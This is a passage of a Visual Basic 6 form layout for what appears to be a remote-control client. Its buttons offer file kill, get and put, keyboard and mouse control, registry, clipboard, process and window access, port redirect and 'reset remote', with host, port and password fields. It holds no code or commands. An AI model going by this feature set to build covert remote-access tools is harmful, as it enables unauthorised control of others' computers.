         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "kill file(s)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   72
         Left            =   5880
         TabIndex        =   183
         Top             =   820
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "put file"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   69
         Left            =   5880
         TabIndex        =   179
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "make dir"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin VB.TextBox Text18 
         Appearance      =   0  'Flat
         BackColor       =   &H00400000&
         ForeColor       =   &H00FFFFFF&
         Height          =   285
         Left            =   840
         TabIndex        =   181
         Top             =   2160
         Width           =   5040
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   68
         Left            =   0
         TabIndex        =   178
         Top             =   2160
         Width           =   800
         _ExtentX        =   1402
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "refresh"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   70
         Left            =   5880
         TabIndex        =   180
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "remove dir"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin MSComctlLib.ListView lstFiles 
         Height          =   1905
         Left            =   0
         TabIndex        =   177
         Top             =   240
         Width           =   5880
         _ExtentX        =   10372
         _ExtentY        =   3360
         View            =   3
         LabelEdit       =   1
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         AllowReorder    =   -1  'True
         FullRowSelect   =   -1  'True
         _Version        =   393217
         ForeColor       =   16776960
         BackColor       =   4924675
         Appearance      =   0
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Filename"
            Object.Width           =   4586
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Length"
            Object.Width           =   1411
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Attrib"
            Object.Width           =   1058
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Date"
            Object.Width           =   2787
         EndProperty
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   255
         Index           =   71
         Left            =   5880
         TabIndex        =   182
         Top             =   560
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         AlignCaption    =   4
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "get file(s)"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Timer tmrPing 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   3360
      Top             =   -120
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   0
      Left            =   -120
      TabIndex        =   23
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   11
         Left            =   0
         TabIndex        =   24
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   ping host"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   12
         Left            =   0
         TabIndex        =   25
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   ping server"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   14
         Left            =   0
         TabIndex        =   26
         Top             =   570
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   get info"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   1
      Left            =   1200
      TabIndex        =   27
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   18
         Left            =   0
         TabIndex        =   28
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   admin"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   2
      Left            =   2520
      TabIndex        =   29
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   23
         Left            =   0
         TabIndex        =   30
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   keyboard"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   24
         Left            =   0
         TabIndex        =   31
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   mouse"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   26
         Left            =   0
         TabIndex        =   32
         Top             =   570
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   live control"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   27
         Left            =   0
         TabIndex        =   33
         Top             =   860
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   chat"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   3
      Left            =   3840
      TabIndex        =   34
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   29
         Left            =   0
         TabIndex        =   35
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   process"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   30
         Left            =   0
         TabIndex        =   36
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   window"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   31
         Left            =   0
         TabIndex        =   37
         Top             =   860
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   registry"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   32
         Left            =   0
         TabIndex        =   38
         Top             =   570
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   file"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   33
         Left            =   0
         TabIndex        =   39
         Top             =   1140
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   clipboard"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   4
      Left            =   5160
      TabIndex        =   46
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   1
         Left            =   0
         TabIndex        =   47
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   script IDE"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   16
         Left            =   0
         TabIndex        =   48
         Top             =   570
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   reset remote"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   5
         Left            =   0
         TabIndex        =   248
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   open script"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   5
      Left            =   6480
      TabIndex        =   19
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   6
         Left            =   0
         TabIndex        =   20
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   restart"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   8
         Left            =   0
         TabIndex        =   21
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   nt stuff"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   10
         Left            =   0
         TabIndex        =   22
         Top             =   580
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   extra"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   103
         Left            =   0
         TabIndex        =   255
         Top             =   870
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   port redirect"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.Frame frmMenu 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      BorderStyle     =   0  'None
      ForeColor       =   &H8000000F&
      Height          =   2055
      Index           =   6
      Left            =   7800
      TabIndex        =   15
      Top             =   5280
      Visible         =   0   'False
      Width           =   1215
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   0
         Left            =   0
         TabIndex        =   16
         Top             =   0
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   about"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744576
         ShadowColor     =   16744576
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   3
         Left            =   0
         TabIndex        =   17
         Top             =   570
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   vote"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
      Begin DevPowerFlatBttn.FlatBttn btnMenu6 
         Height          =   270
         Index           =   2
         Left            =   0
         TabIndex        =   18
         Top             =   280
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   476
         AlignCaption    =   2
         AutoSize        =   0   'False
         BackColor       =   0
         Caption         =   "   help"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         HighlightColor  =   16744703
         ShadowColor     =   16744703
         TextColor       =   16026694
         Object.ToolTipText     =   ""
         MousePointer    =   1
      End
   End
   Begin VB.TextBox Text1 
      Appearance      =   0  'Flat
      BackColor       =   &H00400000&
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF00&
      Height          =   3270
      Left            =   1450
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   43
      Top             =   3280
      Width           =   7185
   End
   Begin DevPowerFlatBttn.FlatBttn FlatBttn2 
      Height          =   330
      Left            =   7040
      TabIndex        =   54
      Top             =   6600
      Width           =   750
      _ExtentX        =   1323
      _ExtentY        =   582
      AlignCaption    =   0
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "maximize"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatBttn1 
      Height          =   330
      Left            =   7860
      TabIndex        =   52
      Top             =   6600
      Width           =   760
      _ExtentX        =   1349
      _ExtentY        =   582
      AlignCaption    =   0
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "clear"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   2040
      Top             =   -120
   End
   Begin VB.TextBox Text5 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      IMEMode         =   3  'DISABLE
      Left            =   4920
      PasswordChar    =   "*"
      TabIndex        =   50
      Text            =   "default"
      Top             =   360
      Width           =   1335
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   210
      Index           =   7
      Left            =   75
      TabIndex        =   6
      Top             =   5400
      Visible         =   0   'False
      Width           =   555
      _ExtentX        =   979
      _ExtentY        =   370
      BorderStyle     =   0
      Enabled         =   0   'False
      BackColor       =   0
      Caption         =   "dummy"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      TextColor       =   -2147483630
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin VB.ComboBox Text2 
      BackColor       =   &H00400000&
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFF00&
      Height          =   330
      Left            =   1440
      TabIndex        =   42
      Top             =   6600
      Width           =   5535
   End
   Begin MSWinsockLib.Winsock ws 
      Left            =   2520
      Top             =   -120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text4 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   3520
      TabIndex        =   10
      Text            =   "8000"
      Top             =   360
      Width           =   615
   End
   Begin VB.TextBox Text3 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   1800
      TabIndex        =   9
      Text            =   "127.0.0.1"
      Top             =   360
      Width           =   1335
   End
   Begin DevPowerFlatBttn.FlatBttn btnDisconnect 
      Height          =   285
      Left            =   7470
      TabIndex        =   8
      Top             =   360
      Width           =   1080
      _ExtentX        =   1905
      _ExtentY        =   503
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "disconnect"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16777215
      ShadowColor     =   16761024
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn btnConnect 
      Height          =   285
      Left            =   6360
      TabIndex        =   7
      Top             =   360
      Width           =   1080
      _ExtentX        =   1905
      _ExtentY        =   503
      AutoSize        =   0   'False
      PlaySounds      =   0   'False
      BackColor       =   6957824
      Caption         =   "connect"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      HighlightColor  =   16777215
      ShadowColor     =   16756912
      TextColor       =   16761024
      Object.ToolTipText     =   ""
      MousePointer    =   1
   End
   Begin DevPowerFlatBttn.FlatBttn FlatB 
      Height          =   255
      Index           =   6
      Left            =   75
      TabIndex        =   5
      Top             =   2880
      Width           =   1305
      _ExtentX        =   2302
      _ExtentY        =   450
      AutoSize        =   0   'False
      BackColor       =   6957824
      Caption         =   "client"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
